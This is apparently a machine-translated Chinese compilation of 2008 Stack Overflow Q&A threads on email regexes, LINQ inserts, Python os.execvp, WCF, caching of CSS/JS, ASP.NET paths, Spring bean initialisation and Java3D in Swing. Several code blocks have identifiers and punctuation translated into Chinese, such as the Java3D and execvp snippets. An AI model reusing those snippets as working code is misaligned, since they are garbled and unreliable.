[^()<>@,;:\\".\[\] \000-\031]+(?:(?:(?:\r\n)?[ \t])+|\Z|(?=[\["()<>@,;:\\".\[\
]]))|"(?:[^\"\r\\]|\\.|(?:(?:\r\n)?[ \t]))*"(?:(?:\r\n)?[ \t])*)*\<(?:(?:\r\n)
?[ \t])*(?:@(?:[^()<>@,;:\\".\[\] \000-\031]+(?:(?:(?:\r\n)?[ \t])+|\Z|(?=[\["
()<>@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[ \t])*)(?:\.(?:(?:\r\n)
?[ \t])*(?:[^()<>@,;:\\".\[\] \000-\031]+(?:(?:(?:\r\n)?[ \t])+|\Z|(?=[\["()<>
@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[ \t])*))*(?:,@(?:(?:\r\n)?[
 \t])*(?:[^()<>@,;:\\".\[\] \000-\031]+(?:(?:(?:\r\n)?[ \t])+|\Z|(?=[\["()<>@,
;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[ \t])*)(?:\.(?:(?:\r\n)?[ \t]
)*(?:[^()<>@,;:\\".\[\] \000-\031]+(?:(?:(?:\r\n)?[ \t])+|\Z|(?=[\["()<>@,;:\\
".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[ \t])*))*)*:(?:(?:\r\n)?[ \t])*)?
(?:[^()<>@,;:\\".\[\] \000-\031]+(?:(?:(?:\r\n)?[ \t])+|\Z|(?=[\["()<>@,;:\\".
\[\]]))|"(?:[^\"\r\\]|\\.|(?:(?:\r\n)?[ \t]))*"(?:(?:\r\n)?[ \t])*)(?:\.(?:(?:
\r\n)?[ \t])*(?:[^()<>@,;:\\".\[\] \000-\031]+(?:(?:(?:\r\n)?[ \t])+|\Z|(?=[\[
"()<>@,;:\\".\[\]]))|"(?:[^\"\r\\]|\\.|(?:(?:\r\n)?[ \t]))*"(?:(?:\r\n)?[ \t])
*))*@(?:(?:\r\n)?[ \t])*(?:[^()<>@,;:\\".\[\] \000-\031]+(?:(?:(?:\r\n)?[ \t])
+|\Z|(?=[\["()<>@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[ \t])*)(?:\
.(?:(?:\r\n)?[ \t])*(?:[^()<>@,;:\\".\[\] \000-\031]+(?:(?:(?:\r\n)?[ \t])+|\Z
|(?=[\["()<>@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[ \t])*))*\>(?:(
?:\r\n)?[ \t])*))*)?;\s*) 
```

* * *

## 回答 #8

> 赞同：0
> 
>             
> 
> 时间：2008-10-17T03:38:36.213

如果您使用 Perl，我相信 Regex::Common 模块将是您想要使用的模块，特别是 Regex::Common::Email::Address。

* * *

## 回答 #9

> 赞同：-2
> 
>             
> 
> 时间：2008-10-17T12:57:38.473

我最近必须构建一些 RSS 提要，其中一部分包括遍历 Xml 模式，包括 Webmaster 和ManagingEditor 的项目，这两个项目都被定义为与此模式匹配的电子邮件地址：

```
([a-zA-Z0-9_\-])([a-zA-Z0-9_\-\.]*)@(\[((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\.){3}|((([a-zA-Z0-9\-]+)\.)+))([a-zA-Z]{2,}|(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\]) 
```

# c# - 在数据上下文中插入一行网格

> ID：210975
> 
>         
> 
> 赞同：1
> 
>         
> 
> 时间：2008-10-17T03:02:05.257
> 
>         
> 
> 标签：c#, linq

在 linq 中寻找关于如何将一行 gridview 插入数据上下文的示例。

* * *

## 回答 #1

> 赞同：1
> 
>             
> 
> 时间：2009-04-28T16:18:43.983

```
using (WebShop.DDFAdminwebshopDataContext db = new WebShop.DDFAdminwebshopDataContext())

        {
            var productstags = from productstag in db.sk_productstags where productstag.productid == _productid
                               && productstag.tagid == _tagid select productstag;

            if (productstags.Count() == 0) {

                WebShop.DDFAdmin.sk_productstags entProductTag = new WebShop.DDFAdmin.sk_productstags();
                entProductTag.productid = _productid;
                entProductTag.tagid = _tagid;

                db.sk_productstags.InsertOnSubmit(entProductTag);
                db.SubmitChanges();
            }

        } 
```

* * *

## 回答 #2

> 赞同：1
> 
>             
> 
> 时间：2008-10-17T06:04:07.090

首先 - 你需要一个类型化的对象。如果您的 gridview 已经是数据绑定的，这显然会更容易。您可以使用[InsertOnSubmit](http://msdn.microsoft.com/en-us/library/bb763516.aspx)（新记录）或[Attach](http://msdn.microsoft.com/en-us/library/bb548978.aspx)（更新现有记录）将记录与数据上下文相关联。或者，首先绑定到您从数据上下文中获得的对象。一种简单的方法是通过[GetNewBindingList](http://msdn.microsoft.com/en-us/library/bb534545.aspx)（这取决于场景）。

如果这没有帮助，也许可以解释更多关于你的场景？

# python - 在 Python 中使用 os.execvp

> ID：210978
> 
>         
> 
> 赞同：7
> 
>         
> 
> 时间：2008-10-17T03:04:38.780
> 
>         
> 
> 标签：python, shell, exec

我有一个关于`os.execvp`在 Python 中使用的问题。我有以下用于创建参数列表的代码：

```
args = [“java”
       , 类路径
       , "-Djava.library.path=" + lib_path()
       , 一个
       , "-Xmx1000m"
       ， “-服务器”
       , "code_swarm"
       , 参数
       ]

```

当我使用输出字符串`" ".join(args)`并将其粘贴到我的 shell 提示符中时，JVM 启动正常，一切正常。`os.system(" ".join(args))`如果我在我的 Python 脚本中使用，一切都会正常工作。

*但是*以下代码不起作用：

```
os.execvp("java", args)
```

我收到以下错误：

```
无法识别的选项：-classpath [然后是我创建的类路径，看起来还可以]
无法创建Java虚拟机。

```

那么给了什么？为什么复制/粘贴到外壳或使用`os.system()`工作，但不是`os.execvp()`？

* * *

## 回答 #1

> 赞同：11
> 
>             
> 
> 时间：2008-10-17T03:07:53.280

如果您的“classpath”变量包含例如“-classpath foo.jar”，它将不起作用，因为它认为选项名称是“-classpath foo.jar”。将其拆分为两个参数：[..., "-classpath", classpath, ...]。

其他方式（复制和粘贴以及 system()）之所以有效，是因为 shell 在空格处拆分命令行（除非它们被转义或引用）。命令行实际上是作为数组传递给被调用程序的（与 Windows 不同），JVM 希望找到一个只有“-classpath”的元素，然后是另一个具有类路径的元素。

您可以通过调用以下小型 Python 脚本而不是 JVM 来亲自查看差异：

```
#!/usr/bin/python
import sys
print sys.argv 
```

* * *

## 回答 #2

> 赞同：0
> 
>             
> 
> 时间：2008-10-17T12:11:04.557

确保您不依赖类路径中的 shell 扩展。例如，“~/my.jar”将在 os.system 调用中被 shell 扩展，但不是，我相信 os.execvp 调用。

# wcf - WCF：自动生成数据契约类？

> ID：210983
> 
>         
> 
> 赞同：3
> 
>         
> 
> 时间：2008-10-17T03:08:57.897
> 
>         
> 
> 标签：wcf

我正在使用 subsonic o/rm 来生成我的数据类。但是它生成的活动记录和活动列表类在 WCF 上不起作用。我必须手动编写数据协定类，这对所有属性来说都是相当乏味的工作。有没有办法为 WCF 服务自动生成数据协定类？任何想法表示赞赏。

* * *

## 回答 #1

> 赞同：2
> 
>             
> 
> 时间：2008-10-17T13:30:02.870

我相信[svcutil](http://msdn.microsoft.com/en-us/library/aa347733.aspx)工具可以帮助您...

# javascript - 何时分离文件以节省带宽

> ID：210985
> 
>         
> 
> 赞同：1
> 
>         
> 
> 时间：2008-10-17T03:12:09.653
> 
>         
> 
> 标签：javascript, html, css, performance

我正在为我的网站做一些优化，并试图弄清楚一些内联代码可以有多大，然后才能证明拥有自己的文件而不是内联编写。

我对如何衡量它的猜测是代码量（在这种情况下为 CSS 或 JS）需要大于发送和接收的 HTTP 数据包才能获得 304 响应。

请忽略这样一个事实，即在 HTML 页面中保留样式和 javascript 是一种很好的做法，并且只考虑浏览器性能。:)

* * *

## 回答 #1

> 赞同：5
> 
>             
> 
> 时间：2008-10-17T03:35:50.540

老实说，就浏览器性能而言，将 CSS 和 JS 文件分开并正确设置过期标头以便缓存它们会*提高*性能，而不是降低性能。浏览器将缓存它并且不再请求它，这减少了在多个页面查看期间传输的数据量。

仅当您的大多数受众以空缓存访问您的网站**并且**仅查看 1 个页面时，内联 CSS 和 JS 才有帮助。

看：

*   [http://developer.yahoo.com/performance/](http://developer.yahoo.com/performance/)

*   [http://www.ryandoherty.net/2008/10/12/optimizing-openspacebook/](http://www.ryandoherty.net/2008/10/12/optimizing-openspacebook/)

* * *

## 回答 #2

> 赞同：0
> 
>             
> 
> 时间：2008-10-20T04:02:39.440

我自己多看一点；我认为我走在正确的轨道上。

实际的 HTTP 请求看起来有点像这样：

```
HTTP/1.1 304 Not Modified
Cache-Control: max-age=604800, public
Last-Modified: Tue, 17 Jun 2008 17:20:41 GMT
Date: Mon, 20 Oct 2008 03:49:58 GMT
Server: ucfe 
```

哪个大约是 163 字节？

通过查看此处（[http://www.freesoft.org/CIE/Course/Section4/8.htm](http://www.freesoft.org/CIE/Course/Section4/8.htm)），看起来 TCP 数据包本身的范围可以从大约 20 个字节向上。

所以我猜总的请求 + 响应看起来大约 250 个字节（猜测 30 个字节用于 tcp 数据包 + 一些填充用于请求和响应文本）。真的没什么。

我认为每个人都是对的。没什么大不了的。仍然对这如何影响移动浏览器感兴趣，但是多个请求的延迟将是一个大问题。

如果我的计算有误，请说出来

* * *

## 回答 #3

> 赞同：0
> 
>             
> 
> 时间：2008-10-17T03:38:57.150

我还想补充一点，如果可能的话，您应该将您的 JS/CSS 合并到一个下载中（每个），以节省与 Web 服务器的 HTTP 连接。我相信雅虎在 Ryan 发布的 URL 中建议了这一点。我最终编写了自己的 .NET 组件，它可以结合脚本和 CSS，如果需要，还可以最小化它们并缓存它们（服务器端）。

* * *

## 回答 #4

> 赞同：0
> 
>             
> 
> 时间：2008-10-17T03:41:42.510

但是，同意 Ryan 的观点，如果您的受众只会看到您的网站一次，或者如果您从不希望文件被缓存，那么包括 CSS 和 JS 内联。

最佳实践是让您的服务器将所有 CSS/JS 文件合并并 gzip 到一个可缓存文件中，以节省请求和带宽。

这至少可以在 Tomcat 和 Glassfish 中轻松设置。

# asp.net-mvc - 如何检索 ASP.NET MVC 应用程序的目录？

> ID：210986
> 
>         
> 
> 赞同：0
> 
>         
> 
> 时间：2008-10-17T03:12:57.530
> 
>         
> 
> 标签：asp.net-mvc

新手问题...

如果我有一个位于 Web 应用程序根目录中的文件。如何以编程方式查询该文件的路径？即，它在哪个目录中？

* * *

## 回答 #1

> 赞同：2
> 
>             
> 
> 时间：2008-10-17T03:16:48.817

```
System.Web.HttpServerUtility.MapPath( "~/filename.ext" ); 
```

将为您提供物理（磁盘）路径，您可以将其与 System.IO 方法等一起使用。

```
System.Web.Hosting.VirtualPathUtility.ToAbsolute( "~/filename.ext" ); 
```

会给你“绝对”的虚拟路径。这不是完整的 url，但也不一定是域的根。可能是这样的

```
/admin/文件名.ext

```

如果应用程序植根于子目录中。

* * *

## 回答 #2

> 赞同：0
> 
>             
> 
> 时间：2008-10-17T04:57:44.823

如果你在你的 ASPX 标记中，你可以使用 C# 并使用 ResolveUrl 方法，如下所示：

```
<%= Page.ResolveUrl("~/PathFromRoot/YourFile.pdf") %> 
```

* * *

## 回答 #3

> 赞同：0
> 
>             
> 
> 时间：2008-10-17T03:30:29.350

接近我想要的......除了它似乎没有编译或在我调用它的上下文中无效。

但是我找到了我需要的 System.Web.HttpRuntime.AppDomainAppPath

* * *

## 回答 #4

> 赞同：0
> 
>             
> 
> 时间：2012-07-11T18:29:13.547

老问题，我知道，但我在寻找类似答案时发现了它。除非 API 发生变化，否则 harpo 的答案不起作用的原因是因为`MapPath`是实例方法，而不是静态方法。但不要害怕——`HttpServerUtility`在每个属性的实例中都有一个存在的`Controller`实例`Server`。因此，在您的情况下，如果您在控制器中（或者，我怀疑是视图）：

```
var appRoot = Server.MapPath("~/"); 
```

这应该够了吧！

# java - 初始化 bean 的最佳方法是什么？

> ID：210996
> 
>         
> 
> 赞同：10
> 
>         
> 
> 时间：2008-10-17T03:21:42.677
> 
>         
> 
> 标签：java, spring

在 spring 中，您可以通过使 applicationContext.xml 调用构造函数来初始化 bean，或者您可以在 bean 上设置属性。两种方法之间的权衡是什么？拥有一个构造函数（它强制执行在一种方法中拥有所需的一切）更好还是拥有所有属性更好（这使您可以灵活地仅选择性地注入，例如在单元测试时。）

有什么权衡（在编写一个使用构造函数来建立它的初始状态的 bean 或使用属性和可能的​​ afterProperties() 方法之间）？

* * *

## 回答 #1

> 赞同：15
> 
>             
> 
> 时间：2008-10-17T05:11:04.140

我不确定是否有初始化 bean 的“最佳”方法。我认为两者各有利弊，根据情况，一种或另一种可能是合适的。这当然不是一个详尽的清单，但这里有一些需要考虑的事情。

使用构造函数可以让您拥有一个不可变的 bean。如果您可以将不可变对象适合您的设计，那么它们是很好的。它们不需要线程之间的复制、序列化访问或其他特殊处理。如果你有 setter，你的对象不是不可变的。使用构造函数还可以确保正确初始化对象。构造函数完成后，对象才有效。如果您的对象*需要*使用 setter 来初始化它，则可能存在无效对象。

另一方面，使用构造函数通常会导致伸缩问题。很多时候你会需要很多不同的构造函数，其中大部分是另一个构造函数的超集。通常这些是为了方便。例如：

```
public class Person {
  public Person(String name) { ... }
  public Person(String name, String phone) { ... }
  public Person(String name, String phone, String email) { ... }
} 
```

我非常喜欢的一种替代方案是 Josh Bloch 在 JavaOne 提出的所谓的“增强型”构建器模式。您可以在他的“Effective Java, Second Edition”一书中看到这一点。如果您查看该模式的使用方式，它还将解决您的“afterProperties”方法问题。构建器模式将保证对象被正确初始化。

这是讨论该模式的附加博客文章：[http ://www.screaming-penguin.com/node/7598](http://www.screaming-penguin.com/node/7598)

我不确定这是否符合您的弹簧要求，但总的来说，我是 builder 的忠实粉丝。

* * *

## 回答 #2

> 赞同：3
> 
>             
> 
> 时间：2008-10-17T04:50:23.730

IMO 构造函数注入的主要优点是它与不变性兼容。但是，如果一个类有超过 3 个依赖项，这需要提供一个带有大量参数的构造函数，这很笨拙。

在使用 setter-injection 时，我更喜欢使用`@PostConstruct`注解来标识初始化方法。与您提到的方法相比，这涉及到与 Spring 框架的更松散的耦合`afterProperties()`（实际上，我认为它是`afterPropertiesSet()`）。另一个选项是`<bean>`元素的 init 方法属性。

* * *

## 回答 #3

> 赞同：2
> 
>             
> 
> 时间：2008-10-17T09:08:42.553

我不知道您当前使用的版本，但如果是 Spring 2.5，您还可以考虑在某些情况下使用 @Autowired 注释。这粗略仅适用于对其他 bean 的引用，而不适用于字符串等，如 lycony 的示例。

它为您节省了创建 setter 和/或构造函数以及大量配置的负担。一个小例子：

```
public class MyPersonBean {
  @Autowired
  private PersonManager personManager;

  public void doSomething() {
    this.personManager.doSomething();
  }
} 
```

在您的配置文件中：

```
<context:annotation-config/> 
```

自动装配是按类型完成的，所以如果你有一个 PersonManager 类型的 bean，它将把它注入到带注释的字段中。如果您有更多该类型的 bean，您可以使用 @Qualifier 注释将它们区分开来......

[您可以在Spring 参考文档](http://static.springframework.org/spring/docs/2.5.x/reference/beans.html#beans-autowired-annotation)中找到有关自动装配的更多信息

我在之前的项目中开始将@Autowired 与组件扫描结合使用，我必须说我摆脱了 90% 以上的 Spring 配置文件。

* * *

## 回答 #4

> 赞同：0
> 
>             
> 
> 时间：2008-10-18T03:42:31.573

权衡：

构造函数：好处：可以非常简单，尤其是。具有三个或更少的属性来初始化。一次性，无需/无需担心的额外配置。

缺点：必须为几种情况创建多个构造函数构造函数不是继承的，因此类必须调用 super() 并提供重复的构造函数以允许以前的行为。

Setter：好处：子继承setter，因此可以很容易地覆盖属性以影响构造后的行为。可以以统一的方式指定多个属性，而无需查找不同的方法签名（JavaBeans 约定）

缺点：必须为每个属性显式调用每个 setter。导致某些类显式设置了大量属性。

* * *

## 回答 #5

> 赞同：0
> 
>             
> 
> 时间：2009-01-22T15:52:41.113

您也可以使用`@Resource`to autowire 而不是`@Autowired`，这有点像 autowire byName 所以您不必担心是否有更多具有相同类型的bean（ofc您也可以使用 来处理它`@Qualifier`，但我只建议描述一个豆的特征）。这实际上取决于您的用例，哪种方式是最好的，因此您必须根据您的情况对其进行评估并做出决定。

# java - Canvas3D 未出现在 Swing 窗口中

> ID：210998
> 
>         
> 
> 赞同：1
> 
>         
> 
> 时间：2008-10-17T03:22:05.450
> 
>         
> 
> 标签：java, swing, java-3d

我试图在 Swing JPanel 中插入一个 Canvas3D 对象，但代码似乎不起作用（即没有任何反应）：

```
        Canvas3D 画布 = 新 Canvas3D(SimpleUniverse.getPreferredConfiguration());
        简单宇宙宇宙 = 新的简单宇宙（画布）；
        BranchGroup root = new BranchGroup();
        root.addChild(new ColorCube());
        Universe.addBranchGraph（根）；
        Universe.getViewingPlatform().setNominalViewingTransform();
        canvasPanel.add(画布);

```

我错过了什么？JPanel 是使用 NetBean 的可视化编辑器创建的。

* * *

## 回答 #1

> 赞同：3
> 
>             
> 
> 时间：2008-10-17T05:04:47.100

可能你必须在面板上设置一个布局管理器，它会自动将子组件扩展到整个区域。JPanel 默认有一个 FlowLayout，它*不会*展开子组件。您可以通过调用来尝试使用 BorderLayout：

```
canvasPanel.setLayout(new BorderLayout()); 
```

* * *

## 回答 #2

> 赞同：0
> 
>             
> 
> 时间：2008-10-17T03:32:47.333

Canvas3D 需要传递给它的大小；从 SimpleUniverse 设置首选配置是不够的。就我而言，这意味着这段代码：

```
        // 3D画布初始化
        Canvas3D 画布 = 新 Canvas3D(SimpleUniverse.getPreferredConfiguration());
        简单宇宙宇宙 = 新的简单宇宙（画布）；
        BranchGroup root = new BranchGroup();
        root.addChild(new ColorCube());
        Universe.addBranchGraph（根）；
        Universe.getViewingPlatform().setNominalViewingTransform();
        canvas.setSize(100, 100); 
        canvasPanel.add(画布);
```********* 
```***********